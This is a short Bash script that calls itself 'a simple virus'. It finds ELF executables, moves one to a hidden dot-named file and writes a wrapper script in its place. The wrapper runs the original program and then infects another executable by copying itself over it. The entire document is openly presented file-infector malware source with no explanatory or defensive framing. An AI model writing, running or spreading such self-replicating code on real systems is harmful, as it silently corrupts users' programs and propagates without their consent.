#!/bin/bash
echo "Hello! I am a simple virus!"
find -exec file {} \; | grep -i elf | cut -f1 -d: | tr -d ':./' > .original_files

function infect()
{
        mv $1 .$1
        echo "#!/bin/bash" > $1
        echo "echo Hello! I am a simple virus!\\n" >> $1
        echo "echo \$0 | awk -F "/" '{print \$NF}' > .filename" >> $1
        echo "cat .filename | while read FILENAME" >> $1
        echo "do" >> $1
        echo -e "\t./.\$FILENAME \"\$@\"" >> $1
        echo -e "\tbreak" >> $1
        echo "done" >> $1
        echo "find -exec file {} \; | grep -i elf | cut -f1 -d: | tr -d ':./' > .original_files" >> $1
        echo "cat .original_files | while read LINE" >> $1
        echo "do" >> $1
        echo "if [ -e .\$LINE ]" >> $1
        echo -e "\tthen" >> $1
        echo -e "\t\tcontinue" >> $1
        echo "else" >> $1
        echo -e "\tmv \$LINE .\$LINE" >> $1
        echo -e "\tcp \"\$0\" \$LINE" >> $1
        echo -e "\tbreak" >> $1
        echo "fi" >> $1
        echo "done" >> $1
        chmod u+x $1
}

self="virus"
cat .original_files | while read LINE
do
	if [ "$LINE" != "$self" ]
			then
					infect $LINE
					break
	fi
done